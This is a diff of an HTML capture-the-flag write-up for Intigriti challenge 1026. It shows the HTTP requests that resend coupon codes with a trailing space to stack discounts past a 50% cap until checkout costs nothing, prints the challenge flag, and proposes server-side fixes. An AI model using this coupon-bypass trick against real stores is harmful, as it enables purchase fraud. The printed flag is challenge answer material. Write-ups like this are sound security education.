+  <div class="step-num">01</div>
   <div class="step-content">
     <div class="step-title">Put the Midnight Collection in the cart</div>
-    <div class="code-block bare">
-      <pre><span class="key">POST</span> /api/cart/items HTTP/1.1
+    <pre><span class="key">POST</span> /api/cart/items HTTP/1.1
 Host: challenge-1026.challenges.intigriti.io
 Content-Type: application/json
 
 {"productId":"midnight-vault"}
 
 <span class="cmt">→ 200 OK · cartTotal: "666.00"</span></pre>
-    </div>
   </div>
 </div>
 
 <div class="step">
-  <div class="step-num">2</div>
+  <div class="step-num">02</div>
   <div class="step-content">
     <div class="step-title">Pick up the second coupon from the newsletter form</div>
-    <div class="code-block bare">
-      <pre><span class="key">POST</span> /api/newsletter HTTP/1.1
+    <pre><span class="key">POST</span> /api/newsletter HTTP/1.1
 Host: challenge-1026.challenges.intigriti.io
 Content-Type: application/json
 
 {"email":"a@a.com"}
 
 <span class="cmt">→ 200 OK · {"code": "NEWS30"}</span></pre>
-    </div>
   </div>
 </div>
 
 <div class="step">
-  <div class="step-num">3</div>
+  <div class="step-num">03</div>
   <div class="step-content">
     <div class="step-title">Apply both codes the intended way — lands at the 50% cap</div>
-    <div class="code-block bare">
-      <pre><span class="key">POST</span> /api/cart/coupon  {"code":"NIGHT20"}
+    <pre><span class="key">POST</span> /api/cart/coupon  {"code":"NIGHT20"}
 <span class="cmt">→ 200 OK · 20% · cartTotal: 532.80</span>
 
 <span class="key">POST</span> /api/cart/coupon  {"code":"NEWS30"}
 <span class="cmt">→ 200 OK · 50% total · cartTotal: 333.00</span></pre>
-    </div>
   </div>
 </div>
 
 <div class="step">
-  <div class="step-num">4</div>
+  <div class="step-num">04</div>
   <div class="step-content">
     <div class="step-title">Resend both codes with a trailing space — past the cap</div>
-    <div class="code-block bare">
-      <pre><span class="key">POST</span> /api/cart/coupon  {"code":"NIGHT20<span class="ws"> </span>"}
+    <pre><span class="key">POST</span> /api/cart/coupon  {"code":"NIGHT20<span class="ws"> </span>"}
 <span class="cmt">→ 200 OK · 70% total · cartTotal: 199.80</span>
 
 <span class="key">POST</span> /api/cart/coupon  {"code":"NEWS30<span class="ws"> </span>"}
 <span class="cmt">→ 200 OK · 100% total · cartTotal: 0.00</span></pre>
-    </div>
   </div>
 </div>
 
 <div class="step">
-  <div class="step-num">5</div>
+  <div class="step-num">05</div>
   <div class="step-content">
     <div class="step-title">Check out — nothing left to pay</div>
     <div class="code-block">
-      <div class="code-tab">
-        <svg width="9" height="9" viewBox="0 0 16 16" fill="none"><path d="M2 8h12M8 2l6 6-6 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        POST /api/checkout
-      </div>
+      <div class="code-tab">POST /api/checkout</div>
       <pre>{}
 
 HTTP/1.1 <span class="val">200 OK</span>
@@ -650,11 +598,8 @@ HTTP/1.1 <span class="val">200 OK</span>
  "flag": "INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}"}</span></pre>
     </div>
     <div class="flag-card">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" style="flex-shrink:0;color:#659287">
-        <path d="M4 4v16M4 4h11l-2 4 2 4H4" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"/>
-      </svg>
       <div>
-        <div class="flag-label">Flag</div>
+        <div class="flag-label">flag</div>
         <div class="flag-value">INTIGRITI{094638e6-ba2f-4c50-8bb4-41ced0d5debd}</div>
       </div>
     </div>
@@ -664,7 +609,6 @@ HTTP/1.1 <span class="val">200 OK</span>
 
 <hr>
 
-<!-- ── IMPACT ── -->
 <h2>Why This Isn't Just a Curiosity</h2>
 <p>
   The practical ceiling here — exactly double, not unlimited — comes from this
@@ -679,16 +623,14 @@ HTTP/1.1 <span class="val">200 OK</span>
 
 <hr>
 
-<!-- ── FIX ── -->
 <h2>Closing the Gap</h2>
 
 <div class="fix">
-  <div class="fix-num">1</div>
+  <div class="fix-num">01</div>
   <div class="fix-content">
     <div class="fix-title">Normalize before either check runs, and reuse that exact value</div>
     <p style="margin-bottom:10px;">Trim and lowercase the code once, at the top of the handler, and let both the validity check and the dedup check read from that single normalized variable — never the original input again.</p>
-    <div class="code-block bare">
-      <pre><span class="key">const</span> normalized = code.trim().toUpperCase();
+    <pre><span class="key">const</span> normalized = code.trim().toUpperCase();
 
 <span class="key">if</span> (!KNOWN_CODES.has(normalized))
   <span class="key">throw</span> <span class="val">'Invalid coupon'</span>;
@@ -697,43 +639,35 @@ HTTP/1.1 <span class="val">200 OK</span>
   <span class="key">throw</span> <span class="val">'Coupon already applied'</span>;
 
 appliedCodes.add(normalized);</pre>
-    </div>
   </div>
 </div>
 
 <div class="fix">
-  <div class="fix-num">2</div>
+  <div class="fix-num">02</div>
   <div class="fix-content">
     <div class="fix-title">Make the stacking limit a real, server-side number</div>
     <p style="margin-bottom:10px;">A Set only answers "have I seen this exact key before" — it isn't a stacking policy. If any code is meant to apply more than once, say so explicitly with a counted limit, not an implicit side effect of how the dedup check happens to compare values.</p>
-    <div class="code-block bare">
-      <pre><span class="key">const</span> MAX_USES_PER_CODE = 1;
+    <pre><span class="key">const</span> MAX_USES_PER_CODE = 1;
 <span class="key">const</span> uses = appliedCodes.get(normalized) ?? 0;
 <span class="key">if</span> (uses >= MAX_USES_PER_CODE)
   <span class="key">throw</span> <span class="val">'Coupon already applied'</span>;
 appliedCodes.set(normalized, uses + 1);</pre>
-    </div>
   </div>
 </div>
 
 <div class="callout">
-  <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
-    <path d="M3 8l3.5 3.5L13 5" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"/>
-  </svg>
-  <span>
-    Fix 1 removes the discrepancy entirely. Fix 2 is the belt-and-suspenders
-    version — it turns "how many times can this apply" from an accident of
-    string comparison into a number someone actually chose.
-  </span>
+  Fix 1 removes the discrepancy entirely. Fix 2 is the belt-and-suspenders
+  version — it turns "how many times can this apply" from an accident of
+  string comparison into a number someone actually chose.
 </div>
 
 <hr>
 <footer>
-  <span>Intigriti Challenge 1026 — Business Logic Error &nbsp;·&nbsp; October 2026</span>
+  <span>intigriti challenge 1026 — business logic error · october 2026</span>
   <span>
-    <a href="https://app.intigriti.com/researcher/profile/rawsid1106" style="color:var(--sage-dark)">rawsid1106</a>
+    <a href="https://app.intigriti.com/researcher/profile/rawsid1106">rawsid1106</a>
     &nbsp;·&nbsp;
-    <a href="https://challenge-1026.challenges.intigriti.io" style="color:var(--sage-dark)">challenge-1026.challenges.intigriti.io</a>
+    <a href="https://challenge-1026.challenges.intigriti.io">challenge-1026.challenges.intigriti.io</a>
   </span>
 </footer>
 
